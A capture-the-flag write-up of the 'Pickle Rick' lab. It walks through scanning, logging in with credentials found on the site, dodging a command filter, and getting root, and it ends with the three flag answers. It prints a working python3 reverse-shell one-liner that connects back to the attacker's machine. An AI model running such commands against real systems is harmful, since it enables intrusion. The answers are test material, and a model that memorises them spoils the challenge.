# Pickle Rick

Help Morty!

Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!

I need you to *BURRRP*....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is, I have no idea what the *BURRRRRRRRP*, password was! Help Morty, Help!

```
ip = 10.10.131.77
```

## Nmap
```
nmap -sC -sV -oN initial.log 10.10.131.77
```

>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
>
>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

## Task 1.

```
nikto -h http://10.10.131.77 | tee nikto.log
```

> \+ "robots.txt" retrieved but it does not contain any 'disallow' entries (which is odd).
>
> \+ /login.php: Admin login page/section found.

After inspecting the webpage you can find:

>*Note to self, remember username!*
>
>**Username:** `R1ckRul3s`

Looking into `http://10.10.131.77/robots.txt`, we can find:

> Wubbalubbadubdub

Using **gobuster** I'm going to scan `http://10.10.131.77/` for hidden directories or files using a wordlist and checks specified file extensions like php or txt.

```
gobuster dir -u http://10.10.131.77/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,sh,cgi,html,css,js,py
```

>/index.html           (Status: 200) [Size: 1062]
>
>/login.php            (Status: 200) [Size: 882]
>
>/assets               (Status: 301) [Size: 313] [--> http://10.10.131.77/assets/]
>
>/portal.php           (Status: 302) [Size: 0] [--> /login.php]

Access the login at `http://10.10.131.77/login.php` with:

>**Username:** R1ckRul3s
>
>**Password:** Wubbalubbadubdub

I find a command pannel where I can insert bash commands. Now, I am going to show the commands tried and the outputs:

```
ls -al

total 40
drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
-rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
-rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
-rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
-rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
-rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt
```

```
cat Sup3rS3cretPickl3Ingred.txt

Command disabled to make it hard for future PICKLEEEE RICCCKKKK.
```

```
more Sup3rS3cretPickl3Ingred.txt

Command disabled to make it hard for future PICKLEEEE RICCCKKKK.
```

```
nl Sup3rS3cretPickl3Ingred.txt

1	mr. meeseek hair
```

Also, with the following command I could print the contents of all the files in the current folder:

```
grep -R .
```

```
find / -type f -name '*secret*'

/snap/core/17200/etc/ppp/chap-secrets

/snap/core/17200/etc/ppp/pap-secrets

/snap/core/17200/usr/share/ppp/chap-secrets

...

```

```
find / -type f -name '*ingredient*'

/home/rick/second ingredients

```

```
nl /home/rick/'second ingredients'

1	1 jerry tear
```

Inspecting the html I find this: ` Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== `. It seems as a base64 string, so, I'm going to try to decode it:

```
echo Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d

rabbit hole
```

I will attempt to gain access to a root terminal to check if the third ingredient is concealed in a protected file. In order to achieve this I am going to use: Reverse Shell. So, I go to `https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet` and I look what has the system installed:

```
which php perl python python3 asp

/usr/bin/php

/usr/bin/perl

/usr/bin/python3
```

First, I run in my machine:

```
ip addr show tun0
```

```
nc -lnvp 9999
```

Starting with python3, looking at the cheatsheet I run in the webpage Command Panel:

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

This grants me access to a shell, but it doesnt work very well. So, I am going to stabilize this shell. In order to do it I am going to use: `stabilize_shell.sh` script. Once stablished I upload the file `linpeas.sh` to search for possible paths to escalate privileges with the script `upload_file.py`. Once I run `linpeas.sh` I find that the sudo version is vulnerable (is an old version) but also, the regular user can start a sudo terminal. Once I am with privileged access, I access the root terminal and I find the file `3rd.txt`.

```
cat 3rd.txt

3rd ingredients: fleeb juice
```


1. What is the first ingredient that Rick needs?

    `mr. meeseek hair`

2. What is the second ingredient in Rick’s potion?

    `1 jerry tear`

3. What is the last and final ingredient?

    `fleeb juice`